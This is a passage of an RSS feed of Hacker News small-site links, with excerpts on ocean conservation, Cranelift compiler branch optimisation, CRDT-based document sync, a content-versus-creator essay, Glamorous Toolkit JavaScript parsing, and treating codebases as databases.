<p>You look at the statistics, where we are headed, and it√¢‚Ç¨‚Ñ¢s scary, daunting. I focus on what I can do and form collaborations with very good people. Lots of people have part of the answer but not the whole thing. Together, we can build that jigsaw puzzle and make a difference.</p>

<ul><li> is the author of <span>Citizen Scientist: Searching for Heroes and Hope in an Age of Extinction</span>, the winner of Stanford√¢‚Ç¨‚Ñ¢s Knight-Risser Prize in Western Environmental Literature, and a Stanford media fellow.</li></ul>
<p><em>Lead image: Vojce / Shutterstock</em></p>
    </article></div>]]>
            </description>
            <link>http://wise.nautil.us/feature/663/how-surprising-connections-can-save-the-ocean</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127918</guid>
            <pubDate>Sat, 13 Feb 2021 23:10:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cranelift, Part 2: Compiler Efficiency, CFGs, and a Branch Peephole Optimizer]]>
            </title>
            <description>
<![CDATA[
Score 13 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127665">thread link</a>) | @PoignardAzur
<br/>
February 13, 2021 | https://cfallin.org/blog/2021/01/22/cranelift-isel-2/ | <a href="https://web.archive.org/web/*/https://cfallin.org/blog/2021/01/22/cranelift-isel-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post is the second in a three-part series about
<a href="https://github.com/bytecodealliance/wasmtime/tree/main/cranelift">Cranelift</a>.
In the <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">first post</a>, I
described the context around Cranelift and our project to replace its
backend code-generation infrastructure, and detailed the
instruction-selection problem and how we solve it. The remaining two
posts will be deep-dives into some interesting engineering problems.</p>

<p>In this post, I want to dive into the <em>compiler performance</em> aspect of
our work more deeply. (In the next post we‚Äôll explore correctness.)
There are many interesting aspects of compilation speed I could talk
about, but one particularly difficult problem is the handling of
<em>control flow</em>: how do we translate structured control flow at the
Wasm level into control-flow graphs at the IR level, and finally to
branches in a linear stream of instructions at the machine-code level?</p>

<p>Doing this translation efficiently requires careful attention to the
overall pass structure, with the largest wins coming when one can
completely eliminate a category of work. We‚Äôll see this in how we
combine several passes in a traditional lowering design (critical-edge
splitting, block ordering, redundant-block elimination, branch
relaxation, branch target resolution) into <em>inline transforms</em> that
happen during other passes (lowering of the CLIF, or Cranelift IR,
into machine-specific IR; and later, binary emission).</p>

<p>This post basically describes the
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/codegen/src/machinst/buffer.rs"><code>MachBuffer</code></a>,
a ‚Äúsmart machine-code buffer‚Äù that knows about branches and edits them
on-the-fly as we emit them, and the
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/codegen/src/machinst/blockorder.rs"><code>BlockLoweringOrder</code></a>,
which allows us to lower code in final basic-block order, with split
critical edges inserted implicitly, by traversing a never-materialized
implicit graph. The work was done mostly in <a href="https://github.com/bytecodealliance/wasmtime/pull/1718">Cranelift PR
#1718</a>, which
resulted in a ~10% compile-time improvement and a ~25%
compile+run-time improvement on a CPU-intensive benchmark (<code>bz2</code>).</p>

<h2 id="control-flow-graphs">Control-Flow Graphs</h2>

<p>Before we discuss any of that, we need to review control-flow graphs
(CFGs)! The CFG is a fundamental data structure used in almost all
modern compilers. In brief, it represents how execution (i.e., program
control) may flow through instructions, using graph nodes to represent
linear sequences of instructions and graph edges to represent all
possible control-flow transfers at branch instructions.</p>

<p>At the end of the instruction selection process, which we learned
about in the <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">previous post</a>, we have a function body lowered into VCode that consists of
<a href="https://en.wikipedia.org/wiki/Basic_block"><em>basic blocks</em></a>. A basic
block is a contiguous sequence of instructions that has no outbound
branches except at the end, and has no inbound branches except at the
beginning. In other words, it is ‚Äústraight-line‚Äù code: execution
always starts at the top and proceeds to the end. An example
control-flow graph (CFG) consisting of four basic blocks is shown
below:</p>

<p><img src="https://cfallin.org/assets/2020-10-08-cfg-web.svg" alt="Figure: Control-flow graph with four basic blocks in a diamond"></p>

<p>Control-flow graphs are excellent data structures for compilers to
use. By making the flow of execution explicit as graph edges, rather
than reasoning about instructions in order in memory as the processor
sees them, many analyses can be performed more easily. For example,
<a href="https://en.wikipedia.org/wiki/Data-flow_analysis">dataflow analysis</a>
problems can be solved easily because the CFG makes traversal of
possible control-flow transfers easy. Graph-based representations of
the program also allow easier <em>moving and insertion of code</em>: it is
less error-prone to manipulate an explicit graph than to reason about
implicit control-flow (e.g. fallthrough from a not-taken conditional
branch). Finally, the graph representation factors out the question of
<em>block ordering</em>, which can be important for performance; we can
address this problem separately by choosing how we serialize the graph
nodes (blocks). For these reasons, most compiler IRs, including
Cranelift‚Äôs CLIF and <code>VCode</code>, are CFG-based.</p>

<p>(Historical note: control-flow graphs were invented by the late
<a href="https://en.wikipedia.org/wiki/Frances_Allen">Frances Allen</a>, who
largely established the algorithmic foundations that modern compilers
use. Her paper <a href="https://www.clear.rice.edu/comp512/Lectures/Papers/1971-allen-catalog.pdf">A catalogue of optimizing
transformations</a><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>
covers essentially all of the important optimizations used today and
is well worth a read.)</p>

<h2 id="cpus-and-branch-instructions">CPUs and Branch Instructions</h2>

<p>To represent a CFG‚Äôs end-of-block branches at the instruction level,
we can use <em>two-way branches</em>: these are instructions that branch
either to one basic-block target if some condition is true, or another
if the condition is false. (Basic blocks can also end in simple
unconditional single-target branches.) We wrote such a branch as <code>if
r0, L1, L2</code> above; this means that the block <code>L0</code> will be followed in
execution either by <code>L1</code> or <code>L2</code>, depending on the value in <code>r0</code>.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<h3 id="branches-with-fallthrough">Branches with Fallthrough</h3>

<p>However, CPUs rarely have such two-way branch instructions. Instead,
conditional control-flow in common ISAs is almost always provided with
a <em>conditional branch with fallthrough</em>. This is an instruction that,
if some condition is true, branches to another location; otherwise,
does nothing, and allows execution to continue sequentially. This is a
better fit for a hardware implementation for a number of reasons: it‚Äôs
easier to encode one target than two (the destination of the jump
might be quite far away for some branches, and instructions have
limited bits available), and it‚Äôs usually the case that the compiler
can place one of the successor blocks immediately afterward anyway.</p>

<p>Now, this isn‚Äôt much of a problem if we just want a working compiler;
instead of a two-way branch</p>



<p>We can write a sequence of branches</p>



<p>where <code>br_if</code> branches to <code>L1</code> or falls through to the unconditional
<code>goto</code>. But this is not so efficient in many cases. Consider what
would happen if we laid out basic blocks in the order <code>L0</code>, <code>L2</code>,
<code>L1</code>, <code>L3</code>:</p>

<div><div><pre><code>    L0:
      ...
      br_if r0, L1
      goto L2
    L2:
      ...
      goto L3
    L1:
      ...
      goto L3
    L3:
      ...
      return
</code></pre></div></div>

<p>There are two redundant unconditional branches (<code>goto</code> instructions),
each of which uselessly branches to the following instruction. We can
remove both of them with no ill effects, taking advantage instead of
<em>fallthrough</em>, or allowing execution to proceed directly from the end
of one block to the start of the next one:</p>

<div><div><pre><code>    L0:
      ...
      br_if r0, L1
      // ** Otherwise, fall through to L2 **
    L2:
      ...
      goto L3
    L1:
      ...
      // ** Always fall through to L3 **
    L3:
      ...
      return
</code></pre></div></div>

<p>This seems like an easy enough problem to solve: we just need to
recognize when a branch is redundant and remove it, right? Well, yes,
but we can do much better than that in some cases; we‚Äôll dig into this
problem in significantly more depth below!</p>

<h3 id="machine-code-encoding-branch-offsets">Machine-code Encoding: Branch Offsets</h3>

<p>So far, we‚Äôve written our machine instructions in a way that humans
can read, using <em>labels</em> to refer to locations in the instruction
stream. At the hardware level, however, these labels do not exist;
instead, the machine code branches contain target <em>addresses</em> (usually
encoded as relative <em>offsets</em> from the branch instruction). In other
words, we do not see <code>goto L3</code>, but rather <code>goto +32</code>.</p>

<p>This gives rise to several complications when emitting machine code
from a list of instruction <code>struct</code>s.  At the most basic level, we
have to resolve labels to offsets and then patch the branches
appropriately. This is analogous to (but at a lower level than) the
job of a <a href="https://en.wikipedia.org/wiki/Linker_(computing)">linker</a>:
we resolve symbols to concrete values after deciding placement, and
then edit the code according to <em>relocations</em> to refer to those
symbols. In other words, whenever we emit a branch, we make a note (a
relocation, or ‚Äúlabel use‚Äù in our <code>MachBackend</code>) to go back later and
patch it with the resolved label offset.</p>

<p>The second, and more interesting, problem arises because not all
branch instructions can necessarily refer to all possible labels! As a
concrete example, on AArch64, conditional branches have a ¬±1 MB range,
and unconditional branches have a ¬±128 MB range. This arises out of
instruction-encoding considerations: particularly in
fixed-instruction-size ISAs (such as ARM, MIPS, and RISC V), less than
a full machine word of bits are available for the immediate jump
offset that is embedded in the instruction word. (The instruction
itself is always a machine-word wide, and we need some bits for the
opcode and condition code too!) On x86, we have limits for a different
reason: the variable-width encoding allows either a one-byte offset
(allowing a ¬±128 byte range) or four-byte offset (allowing a ¬±2 GB
range).</p>

<p>To make a branch to a far-off label, then, on some machines we need to
either use a different sort of branch than the default choice for the
instruction selector, or we need to use a form of <em>indirection</em>, by
targetting the original branch to <em>another branch</em>, the latter in a
special form. The former is tricky because we do not know whether a
target will be in-range until all code is lowered and placement is
computed; so we need to either optimistically or pessimistically lower
branches to the shortest or longest form (respectively) and possibly
switch later. To make matters worse, as we edit branches to use a
shorter or longer form, their length may change, moving <em>other</em>
targets into or out of range; in the most general solution, this is a
‚Äúfixpoint problem‚Äù, where we iterate until no more changes occur.</p>

<h2 id="challenges-in-lowering-cfgs-to-machine-code">Challenges in Lowering CFGs to Machine Code</h2>

<p>So far, we have a way to produce <em>correct</em> machine code. To emit the
final code for a two-target branch, we can emit a conditional-
followed by unconditional-branch machine instruction. To resolve
branch targets correctly, we can assume that any target could be
anywhere in memory, and always use the long form of a branch; then we
just need to come back in one final pass and fill in the offsets when
we know them.</p>

<p>We can do much better than this, though! Below I‚Äôll describe four
problems and the ways that they are traditionally solved.</p>

<h3 id="problem-1-efficient-use-of-fallthroughs">Problem 1: Efficient use of Fallthroughs</h3>

<p>We described above how <em>branch fallthroughs</em> allow us to omit some
some unconditional branches once we know for sure the order that basic
blocks will appear in the final binary. In ‚Ä¶</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cfallin.org/blog/2021/01/22/cranelift-isel-2/">https://cfallin.org/blog/2021/01/22/cranelift-isel-2/</a></em></p>]]>
            </description>
            <link>https://cfallin.org/blog/2021/01/22/cranelift-isel-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127665</guid>
            <pubDate>Sat, 13 Feb 2021 22:37:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Data Laced with History: Causal Trees and Operational CRDTs (2018)]]>
            </title>
            <description>
<![CDATA[
Score 103 | Comments 10 (<a href="https://news.ycombinator.com/item?id=26127570">thread link</a>) | @mcovalt
<br/>
February 13, 2021 | http://archagon.net/blog/2018/03/24/data-laced-with-history/ | <a href="https://web.archive.org/web/*/http://archagon.net/blog/2018/03/24/data-laced-with-history/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div id="sel_blog20180324data-laced-with-history">
<div>



<article>


<p><img src="http://archagon.net/images/blog/causal-trees/header.jpg"></p>

<p>Hello! This article took a while to cobble together. If you find it useful, please consider leaving a donation via <a href="https://donorbox.org/crdt-article"> </a>, <a href="https://www.buymeacoffee.com/archagon"> </a>, or <a href="ethereum:0x0d5dd8a8Cca8Bf7d0122F7A1Cc76c6b0666fCC56"> </a>. (Thought I'd try something new!) Or, just buy yourself a nice Roost through my <a href="http://amzn.to/2D7uYxz"> </a>. Donation or not, thank you for reading! üòä</p>

<p>(Sorry about the length! At some point in the distant past, this was supposed to be a short blog post. If you like, you can skip straight to the <a href="#demo-concurrent-editing-in-macos-and-ios">demo section</a> to get a sense of what this article is about.)</p>

<p>Embarrassingly, most of my app development to date has been confined to local devices. Programmers like to gloat about the stupendous mental castles they build of their circuitous, multi-level architectures, but not me. In truth, networks leave me quite perplexed. I start thinking about data serializing to bits, servers performing their arcane handshakes and voting rituals, merge conflicts pushing into app-space and starting the whole process over again‚Äîand it all just turns to mush in my head. For peace of mind, my code needs to be <em>locally provable</em>, and this means things like idempotent functions, decoupled modules, contiguous data structures, immutable objects. Networks, unfortunately, throw a giant wrench in the works.</p>

<p>Sometime last year, after realizing that most of my document-based apps would probably need to support sync and collaboration in the future, I decided to finally take a stab at the problem. Granted, there were tons of frameworks that promised to do the hard work of data model replication for me, but I didn‚Äôt want to black-box the most important part of my code. My gut told me that there had to be some arcane bit of foundational knowledge that would allow me to sync my documents in a refined and functional way, decoupled from the stateful spaghetti of the underlying network layer. Instead of downloading a Github framework and <a href="http://amzn.to/2iigBOI">smacking the build button</a>, I wanted to develop a base set of skills that would allow me to easily network <em>any</em> document-based app in the future, even if I was starting from scratch.</p>

<!--more-->

<p>The first order of business was to devise a wishlist for my fantastical system:</p>

<ul>
  <li>Most obviously, users should be able to edit their documents immediately, without even touching the network. (In other words, the system should only require <em>optimistic concurrency</em>.)</li>
  <li>Sync should happen in the background, entirely separate from the main application code, and any remote changes should be seamlessly integrated in real-time. (The user shouldn‚Äôt have to notice that the network is down.)</li>
  <li>Merge should always be automatic, even for concurrent edits. The user should never be faced with a ‚Äúpick the correct revision‚Äù dialog box.</li>
  <li>A user should be able to work on their document offline for an indefinite period of time without accruing ‚Äúsync debt‚Äù. (Meaning that if, for example, sync is accomplished by sending out mutation events, performance should not suffer even if the user spends a month offline and then sends all their hundreds of changes at once.)</li>
  <li>Secondary data structures and state should be minimized. Most of the extra information required for sync should be stored in the same place as the document, and moving the document to a new device should not break sync. (No out-of-band metadata or caches!)</li>
  <li>Network back-and-forth should be condensed to a bare minimum, and rollbacks and re-syncs should practically never happen. To the greatest possible degree, network communication should be stateless and dumb.</li>
  <li>To top it all off, my chosen technique had to pass the ‚ÄúPhD Test‚Äù. That is to say, one shouldn‚Äôt need a PhD to understand and implement the chosen approach for custom data models!</li>
</ul>

<p>After mulling over my bullet points, it occurred to me that the network problems I was dealing with‚Äîbackground cloud sync, editing across multiple devices, real-time collaboration, offline support, and reconciliation of distant or conflicting revisions‚Äîwere all pointing to the same question: was it possible to design a system where any two revisions of the same document could be merged deterministically and sensibly without requiring user intervention? Sync, per se, wasn‚Äôt the issue, since getting data from one device to another was essentially a solved problem. It‚Äôs what happened <em>after</em> sync that was troubling. On encountering a merge conflict, you‚Äôd be thrown into a busy conversation between the network, model, persistence, and UI layers just to get back into a consistent state. The data couldn‚Äôt be left alone to live its peaceful, functional life: every concurrent edit immediately became a cross-architectural matter. On the other hand, if two documents could always be made to merge, then most of that coordination hullabaloo could go out the window. Each part of the system could be made to work at its own pace.</p>

<p>Whether stored as a record in a database or as a stand-alone file, a document could be interpreted as a collection of basic data fields: registers, sequences, dictionaries, and so forth. Looking at the problem from a database perspective, it was actually quite simple to automatically resolve merge conflicts in this kind of table row: just keep overwriting each field with the version sporting the highest timestamp, <a href="https://en.wikipedia.org/wiki/Lamport_timestamps">logical</a> or otherwise. (Ignoring issues of inter-field consistency for now.) Of course, for anything other than basic registers, this was a terrible approach. Sequences and dictionaries weren‚Äôt just blobs of homogeneous data that were overwritten with every change, but complex, mutable structures that users were editing on a granular level. For such a fundamental problem, there was a surprising dearth of solutions out in the real world: most systems punted the task to app-space by asking the client to manually fix any merge conflicts or pick the correct version of a file. It seemed that if the problem of automatic merge for non-trivial data types could be solved‚Äîperhaps by exposing their local, type-specific mutation vocabulary to the storage and replication layers?‚Äîthen a solution to the higher-level problem of automatic document merge would fall within reach.</p>

<p>In hope of uncovering some prior art, I started by looking at the proven leader in the field, Google Docs. Venturing down the deep rabbit hole of <a href="https://en.wikipedia.org/wiki/Collaborative_real-time_editor">real-time collaborative editing</a> techniques, I discovered that many of the problems I faced fell under the umbrella of <a href="https://en.wikipedia.org/wiki/Eventual_consistency">strong eventual consistency</a>. Unlike the more conventional <a href="https://en.wikipedia.org/wiki/Strong_consistency">strong consistency</a> model, where all clients receive changes in identical order and rely on locking to some degree, strong <em>eventual</em> consistency allows clients to individually diverge and then arrive at a final, consistent result once each update has been received. (Or, in a word, when the network is <em>quiescent</em>.)</p>

<p>There were a number of tantalizing techniques to investigate, and I kept several questions in mind while doing my analysis. Could a given technique be generalized to arbitrary and novel data types? Did the technique pass the PhD Test? And was it possible to use the technique in an architecture with smart clients and dumb servers?</p>

<p>The reason for that last question was CloudKit Sharing, a framework introduced in iOS 10. For the most part, this framework functioned as a superset of regular CloudKit, requiring only minor code changes to enable document sharing in an app. A developer didn‚Äôt even have to worry about connecting users or dealing with UI: Apple did most of the hard work in the background while leveraging standard system dialogs. But almost two years later, <a href="https://github.com/search?l=Swift&amp;q=UICloudSharingController&amp;type=Code&amp;utf8=%E2%9C%93">on the order of no one</a> seemed to be using it. Why was this? Most other Apple APIs tended to be readily adopted, especially when they allowed the developer to expand into system areas which were normally out of bounds.</p>

<p>My hunch was that CloudKit Sharing forced the issue of real-time collaboration over a relatively dumb channel, which was a task outside the purview of conventional sync approaches. CloudKit allowed developers to easily store, retrieve, and listen for new data, but not much else besides. No third-party code was allowed to run on Apple‚Äôs servers, so merge conflicts had to be handled locally. But unlike in the single-user case, which presented limited opportunities for concurrent edits, you couldn‚Äôt just pop up a merge dialog every time another participant in your share made a change to your open document. The only remaining options seemed to be some sort of ugly, heuristic auto-merge or data-dropping last-write-wins, neither of which was acceptable for real-time use. Collaboration along the lines of Google Docs appeared to be impossible using this system! But was it really?</p>

<p>I realized that this was my prize to be won. If I could figure out a way to develop auto-merging documents, I‚Äôd be able to implement sync and collaboration in my apps over CloudKit while using Apple‚Äôs first-party sharing UI‚Äîall without having to pay for or manage my own servers. So this became my ultimate research goal: a collaborative iPhone text editing demo that synced entirely over CloudKit. (And here‚Äôs a spoiler: <a href="#demo-concurrent-editing-in-macos-and-ios">it worked!</a>)</p>





<p>There are a few basic terms critical to understanding eventual consistency. A network is comprised of <em>sites</em> (‚Äúdevices‚Äù, ‚Äúpeers‚Äù) operating in parallel, each one producing <em>operations</em> (‚Äúevents‚Äù, ‚Äúactions‚Äù) that mutate the data and exchange information with other sites. The first vital concept here is <strong>causality</strong>. An operation is <em>caused</em> by another operation when it directly modifies or otherwise involves the results of that operation, and determining causality is critical to reconstructing a sensible timeline (or <strong>linearization</strong>) of operations across the network. (An operation that <em>causes</em> another operation must always be ordered first.) However, we can‚Äôt always determine direct causality in a general way, so algorithms often assume that an operation is causally ahead of another one if the site generating the newer operation has already seen the older one at the time of its creation. (In other words, every operation already seen by a site at the time a new operation is created is in that operation‚Äôs <em>caus‚Ä¶</em></p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://archagon.net/blog/2018/03/24/data-laced-with-history/">http://archagon.net/blog/2018/03/24/data-laced-with-history/</a></em></p>]]>
            </description>
            <link>http://archagon.net/blog/2018/03/24/data-laced-with-history/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127570</guid>
            <pubDate>Sat, 13 Feb 2021 22:25:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Curious Case of Content and Creator]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127440">thread link</a>) | @fiesycal
<br/>
February 13, 2021 | http://www.chidwi.com/curious-case-of-content-and-creator | <a href="https://web.archive.org/web/*/http://www.chidwi.com/curious-case-of-content-and-creator">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	
	<div id="vbid-9adcff64-1u0g8kbb" data-menu-name="BLOCKS_PREVIEW_BODY">
		<p>With the explosion of new content fuelled by the internet, for the majority of us, consumption reigns supreme. But I don't believe anybody really stops to think about why we consume the content we do and what that says about us and the content. I think generally content is interesting for one of two reasons</p><ol><li>The content itself</li><li>The creator of the content</li></ol><p>All content exists somewhere on the creator-content continuum (the Triple C).</p><p>To figure out where a piece of content fits it's helpful to define the edges. Amazingly enough Reality TV sits at both extremes of the Triple C.</p><p>The early forms of RTV sit at the pure content side. Think Survivor, Big Brother and The Real World. Literally, random people off the street put into absurd situations for the enjoyment of audiences at home. Do you know who the producers, writers were for those shows? Did anybody know who the contestants were on the show before they started? The only thing interesting about the shows was the misery and drama provided - at least before RTV 'stars' started becoming celebrities in their own right. Pure content.</p><p>The more modern forms of RTV are however pure creator. Think KUWTK and basic YouTube vloggers. Content that is only interesting to people because of who the creator is. Literally, famous people doing everyday things. Is it really that interesting watching someone talk into a camera about going shopping if you're not invested in who they are as a creator?</p><p>Okay, great. We've got the edges, but what about the holy grail. The middle where content and creator meet in a symbiotic mishmash of pure content awesomeness and creator obsession? That's what I call the Dave Chappelle Divide (previously known as the Beatle Bump). What's the DCD? The DCD is where content is interesting in equal parts because of the content itself and because of who the creator is. I could watch Dave Chappelle sitting, smoking a cigarette and ranting about the world for hours.<sup>1</sup> Is that because his routine is insanely interesting or is it because he‚Äôs Dave Chappelle? For me, both. I believe the content could stand on its own but coming from Dave Chappelle enhances its character. I call it the Content Creator Compound Effect.</p><p>Why is getting to the DCD and creating a CCCE important? Because there's this curious moment where the enjoyment and value one derives from content is actually enhanced by your investment in the creator. The example I would use here is Khan Academy. It started off on the pure content side of the Triple C. It stands on its own. It is highly informative and has been useful to millions of students around the world before anyone knew who Sal Khan was. As Sal has grown in fame and importance Khan Academy have tried having other people make videos but for some reason they don‚Äôt quite hit the same way. The same content with a different creator is not as good. In fact I would argue his increasing fame has made Khan Academy even more useful.<sup>2</sup> So does that mean we should find the best content we can, propel those creators to fame so that we are able to enjoy and derive even more value from their content? Maybe.</p><p>One interesting aspect of this continuum is that the better a creator is at creating content the more and more their future content can fall into the trap of being interesting only because of the creator themselves. Looking historically it appears incredibly hard to straddle the Dave Chappelle Divide. The issue here is fame seems to be a powerful drug. And once a creator reaches some threshold where no matter the quality of their content there is a base level of interest in it, often the content seems to suffer. Why is it that most bands' best work is their first album? Why do so many famous Mathematicians make the breakthrough that they're known for in their 20s? It is said that TV dulls the mind, perhaps fame is the true dullant.<sup>3</sup></p><p>Let's take a step back to explore other forms of content and try to place them on the Triple C to see what that says about that content, those creators, ourselves and how we should actually consume them.</p><p>Startup, financial and business advice often, I would argue, sits on the creator side of the Triple C. Most advice of this type suffers from some combination of generic platitude, survivorship bias or any of the other many smart sounding accusations thrown around on Hacker News. When we consume content that we are meant to learn from and apply in our own lives we really need to be wary of content that is interesting only because of its creator. Because if this content is meant to be informative but it is only interesting because of the creator then you're in trouble. How useful, really, is advice from Elon Musk? Most of us are not in his shoes, we don't have access to his connections and opportunity. When he was in our shoes some 25 years ago at this point the world was a much different place. But millions flock to listen to what he has to say. Of course the question is, is this even wrong? Why should the same content from Elon Musk not be more interesting and given more credence than if it were provided to us by an anonymous person on Reddit? You have to ask yourself, is this creator interesting because of previous content they‚Äôve created<sup> 4</sup> in this field? Elon Musk probably doesn‚Äôt have that many interesting or worthwhile things to say about yodeling.<sup>5</sup> Even if the creator is within their sphere of competence you still need to evaluate the content for itself. If you don't, all the content is good for is entertainment. If it is just entertainment you‚Äôre seeking, that, is totally fine. I am a huge fan of entrepreneurship porn but you should be honest with yourself and not be tricked into thinking you're doing something productive. So what, are we supposed to ignore all startup advice? Well no, but you should stop to think a little more, is this within their sphere of competence? Is this only interesting because of the creator or is there some merit to the content? Well how am I supposed to know if there‚Äôs merit to the content, that‚Äôs the whole reason I‚Äôm seeking the content from this creator? Uhh üò¨, good question. Let me get back to you on that one.</p><p>Clubhouse is interesting - watching rooms fluctuate in size when a well known person joins highlights the incredible power of the creator. Their mere presence increases how interesting the content in the room appears and often is. But, I've also been involved in the complete opposite rooms where nobody says anything interesting and I get to the end of the hour and realise I've listened to an hour of people introducing themselves and trying to sound important, get more followers without saying anything actually worth listening to. To be fair I don't blame them, making good content is hard and it also isn't enough, you need to promote it too, but it is hard not to feel a little cheated when you sit through the promotion but the worthwhile content never materialises.</p><p>So, where does this yarn sit? If you think this yarn is in any way interesting and you‚Äôre reading this in 2021 then it‚Äôs purely content based because nobody knows who I am. But if for some inexplicable reason I was to gain some form of notability and you are reading this in 2031 it could theoretically be true that this formation of words is only interesting to you because I‚Äôm the creator. The bizarre case of the wandering content.</p><p>I'm interested to hear where other people would place the content I've discussed and other forms of content on the Triple C. </p>
	</div>
	
</div></div>]]>
            </description>
            <link>http://www.chidwi.com/curious-case-of-content-and-creator</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127440</guid>
            <pubDate>Sat, 13 Feb 2021 22:09:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Analyzing JavaScript, JSX/React Systems]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127430">thread link</a>) | @joubert
<br/>
February 13, 2021 | https://gtoolkit.com/docs/analyzing-js/ | <a href="https://web.archive.org/web/*/https://gtoolkit.com/docs/analyzing-js/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <section id="getstarted">
  <div>
    <div>
      <div>
        
        <p>
          JavaScript is supported through several internal JavaScript importers and parsers.
        </p>
        <h2>Importing plain JavaScript</h2>
        <p>Glamorous Toolkit ships with a built in parser and abstract syntax tree implementation for JavaScript.</p>
        <pre>model := (GtJSImporter new 
  parserClass: JSParser; 
  importDirectory: baseDir) model
        </pre>
        <h2>Importing JSX/React</h2>
        <p>Importing React works in the same way, only with a more enhanced parser to handle JSX and a specialized importer for React components.</p>
        <pre>model := (GtReactImporter new 
  parserClass: JSXParser; 
  importDirectory: baseDir) model
        </pre>
        <p>
          <img src="https://gtoolkit.com/assets/pictures/gtr-importing-react.png">
        </p>
        <h2>Parsing JavaScript</h2>
        <pre>jsFile := 'PATH/TO/FILE.js' asFileReference.
JSParser parse: jsFile contents
        </pre>
        <h2>Parsing JSX</h2>
        <pre>jsFile := 'PATH/TO/FILE.js' asFileReference.
JSXParser parse: jsFile contents
        </pre>
      </div>
    </div>
  </div>
</section>

          </div></div>]]>
            </description>
            <link>https://gtoolkit.com/docs/analyzing-js/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26127430</guid>
            <pubDate>Sat, 13 Feb 2021 22:07:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Database Inside Your Codebase]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26127428">thread link</a>) | @todsacerdoti
<br/>
February 13, 2021 | https://feifan.blog/posts/the-database-inside-your-codebase | <a href="https://web.archive.org/web/*/https://feifan.blog/posts/the-database-inside-your-codebase">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
<div>
  <article>
    
      <p><img src="https://files.tanagram.app/file/tanagram-data/prod-feifans-blog/joshua-sortino-LqKhnDzSF-8-unsplash.jpg">
      </p>
<p>
Navigating codebases of any meaningful size is difficult. Most of a programmer‚Äôs time is spent jumping through the codebase, reading or skimming to build a mental model of the constructs and conventions within it. These constructs ‚Äî among them: the DSLs, interfaces, and taxonomy of types that exist ‚Äî are arguably the most important precursor to understanding where and how to make changes. But these constructs only exist in programmers‚Äô heads. It‚Äôs difficult or impossible to navigate most codebases through the lens of those constructs; programmers lack ‚Äúcode browsers‚Äù that present the underlying code independently of files and the filesystem hierarchy. Yet code browsers that can do so ‚Äî and we‚Äôll look at some examples below ‚Äî would be incredibly useful. This is because instances of these constructs can be thought of as records in a database, albeit an ad-hoc, poorly-specified database that can only be queried through carefully-crafted regexes<a href="#fn:1" id="fnref:1" title="see footnote">1</a>.</p>
<p>
In simple cases, some constructs manifest as naming conventions: prefixes in a name may be a rudimentary way to namespace classes<a href="#fn:2" id="fnref:2" title="see footnote">2</a>, while suffixes may be a rudimentary way to group classes or identify their type<a href="#fn:3" id="fnref:3" title="see footnote">3</a>. But these are easy examples; many patterns are much more subtle.</p>
<h2>
‚ÄúWhere is this used?‚Äù</h2>
<p>
Imagine figuring out ‚Äúwhere is this used?‚Äù, for various types of ‚Äúthis‚Äù:</p>
<p>
Most code editors (perhaps paired with a <a href="https://microsoft.github.io/language-server-protocol/">language server</a>) can show you where local variables are used. This usually also works for finding where methods are invoked ‚Äî although perhaps less reliably in dynamic-dispatch languages, or languages without types.</p>
<p>
What if you want to find where instances of a particular model get created? There may be multiple ways to create a model, so this isn‚Äôt super simple. In Rails, for example, there‚Äôs two built-in ways to create a model: you can either call <code>.new</code> to create a new instance in memory followed by <code>.save</code> to persist it to the database, or call <code>.create</code> to automatically do both. Your particular codebase might have additional wrappers for doing this that you‚Äôre supposed to use. Even worse, imagine that sometimes you create a <code>.new</code> instance, then set some properties on it over the next few lines, then finally call <code>.save</code>. Something like this:</p>
<pre><code>user = User.new
user.email = '<a href="https://feifan.blog/cdn-cgi/l/email-protection" data-cfemail="462e232a2a2906233e272b362a236825292b">[email&nbsp;protected]</a>' unless self.anonymous?
user.save</code></pre>
<p>
Conceptually, that‚Äôs still code that creates an instance of a particular model. But with the intervening syntax, this would be a difficult case to find with <code>grep</code>.</p>
<h2>
Static config</h2>
<p>
At <a href="https://stripe.com/">Stripe</a>, where I work, we have a lot of code for jobs that need to run at certain times each day. For example, we might need to move funds from one financial partner to another at noon UTC each day. Each of these jobs has configuration code describing when and how it should be run, implemented as a <a href="https://www.jetbrains.com/mps/concepts/domain-specific-languages/">DSL</a>. This config might look something like this:</p>
<pre><code>run_config RunConfig.new(
  job_name: 'partner-daily-funding',
  env_vars: self.config_env,
  cron: RunConfig::Cron.new(
    schedule: { hour: 12, minute: 0 }
  ),
  owning_team: Company::Team::Liquidity
)</code></pre>
<p>
